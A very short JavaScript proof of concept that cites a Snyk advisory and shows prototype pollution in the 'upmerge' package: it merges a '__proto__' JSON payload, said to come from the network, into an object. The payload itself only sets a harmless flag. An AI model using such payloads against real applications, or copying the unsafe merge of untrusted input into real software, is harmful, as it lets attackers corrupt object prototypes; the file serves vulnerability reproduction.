//https://snyk.io/vuln/SNYK-JS-UPMERGE-174133
 
  let upmerge = require("upmerge"); // this version is vulnerable
  let payload = '{"__proto__":{ "polluted" : "yes" } }'; // this comes from network
  obj = {};

   
  upmerge.merge({}, JSON.parse(payload));
// End of file
